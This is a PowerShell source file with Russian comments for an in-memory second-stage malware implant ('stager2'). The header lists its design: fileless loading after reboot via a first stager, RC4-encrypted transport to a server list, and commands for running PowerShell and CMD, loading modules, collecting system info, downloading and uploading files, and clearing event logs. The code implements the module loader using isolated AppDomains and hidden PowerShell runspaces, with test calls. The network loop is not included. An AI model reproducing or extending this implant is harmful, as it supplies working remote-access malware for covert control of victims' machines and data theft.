<#
stager2 
не хранится на ПК (подгружается после ребута через stager1), существует только в памяти
INPUT:
RC4key - ключ шифр.транспорта
BuildID - билд stager2
SessionID - во время запуска stager1 генерирует ему ID сессии (может и отправлять на сервер, по этому ID будут назначены команды)
Servers - список серверов (разделитель ',')
дата удаления? нужна ли
еще какие параметры?
ACTIONS (что умеет, команды заходят по номерам)
0 - exit
1 - exec_ps - выполнение повершелл команды
2 - exec_cmd - выполнение CMD команды
3 - load_module (факт передачи модуля, с ним же приходит и module_id, который назначается сервером и по нему идут репорты)
4 - exec_mod - выполнение модульной команды по module_id, предача результата на сервер
5 - sys_info - сис.инфа
6 - list_mod - список выполняемых задач (модулей)
7 - stop_mod - остановка модуля (по module_id)
8 - del_mod - удаление модуля (по module_id)
9 - clear_mods - остановка и удаление всех модулей (нужно ли?)
10 - down_file - скачать и сохранить файл
11 - up_file - загрузить файл на сервер
12 - ev_clear - очистка event logs (но можно делать и командой повершелла)
#>

function Invoke-Stager2 {
	param(
		[String]$sid,
		[String]$key,
		[String]$serv,
		[Int32]$delay = 5
	)
	
	#
	# init
	#
	
	$enc = [System.Text.Encoding]::UTF8;
	$PSDataCollection = 'System.Management.Automation.PSDataCollection[PSObject]';
	$retries = 1;
	$script:SrvIdx = 0;
	$script:SrvList = $serv;
	$script:jobs = @{};
	$script:downloads = @{};
	$script:last = '';
	
	#
	# вспомогательные функции
	#
	
	# подгрузка модуля (инициализация рабочего пространства) БЕЗ ЗАПУСКА!!
	# если модуль с таким ID уже существует, то его перезапишет!!!!
	# $ModuleID - id модуля, по нему происходит управление 
	# (сервер при выдаче генерит рандом строку(6 байт) и выдает вместе с модулем, по этому ID раздает команды и принимает результаты)
	# $ScriptStr - тело скрипта
	function Job-Load {param($id, $data)
		
		$AppDomain = [AppDomain]::CreateDomain($id);
		$PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
		$null = $PSHost.AddScript($data);
		$Result = New-Object $PSDataCollection;
		$script:jobs[$id] = @{'Alias'=$id; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=0; 'Result'=$Result}
	}
	
	# старт модуля, только если он не выполняется, может быть вызван любое число раз (TO DO придумать передачу параметров)
	function Job-Start {param($id)
		if($script:jobs.ContainsKey($id))
		{
			if ($script:jobs[$id]['Job'])
			{
				if ($script:jobs[$id]['Job'].IsCompleted -eq $false) { return }
			}
			
			$PSHost = $script:jobs[$id]['PSHost'];
			$Result = $script:jobs[$id]['Result'];
			$obj = [Type]$PSDataCollection;
			$Begin = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
			$Job = $Begin.Invoke($PSHost, @(($Result -as $obj), ($Result -as $obj)));
			$script:jobs[$id]['Job'] = $Job;
		}
	}
	
	
	# остановка модуля
	function Job-Stop {param($id)
		if($script:jobs.ContainsKey($id))
		{
			$null = $script:jobs[$id]['PSHost'].Stop();
			$script:jobs[$id]['Result'].ReadAll();
#			$null = [AppDomain]::Unload($script:jobs[$id]['AppDomain']);
#			$script:jobs.Remove($id)
		}
	}
	
	
	
	# удаление (выгрузка) модуля
	function Job-Unload {param($id)
		if($script:jobs.ContainsKey($id))
		{
			$null = $script:jobs[$id]['PSHost'].Stop();
			$null = [AppDomain]::Unload($script:jobs[$id]['AppDomain']);
			$script:jobs.Remove($id)
		}
	}
	
	
	
	# состояние исполнения модуля (готово/не готово)
	function Job-IsCompleted {param($id)
		if($script:jobs.ContainsKey($id)) { $script:jobs[$id]['Job'].IsCompleted }
	}
	
	# результаты модуля (output)
	function Job-Result {param($id)
        if($script:jobs.ContainsKey($id)) { $script:jobs[$id]['Result'].ReadAll() }
	}
	
	# список модулей (их ID, разделитель '|')
	function Job-GetList {
		$JobList = $null;
		ForEach($id in $script:jobs.Keys) { $JobList += $id + '|' }
		$JobList
	}
	
	
	
	
	#Job-Start "11" "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[System.Windows.Forms.Messagebox]::Show('job1')"
	Job-Load "22" "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[System.Windows.Forms.Messagebox]::Show('job2')"
	#Job-Start "33" "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[System.Windows.Forms.Messagebox]::Show('job3')"
	
	Job-Load "11" "while(1){$x='job1';$x;Start-Sleep -Seconds 2}"
	#Job-Load "22" "while(1){$x='job2';$x;Start-Sleep -Seconds 2}"
	Job-Load "33" "while(1){$x='job3';$x;Start-Sleep -Seconds 2}"
	
	Job-Start "22"
	
	Start-Sleep -Seconds 5
	
	Job-Start "22"
	
	$r = Job-IsCompleted "11"
	$r
	#Job-GetList
	
	Job-Stop "22"

	
}

Invoke-Stager2 -sid "111" -key "xyz" -serv "1.1.1.1,2.2.2.2"
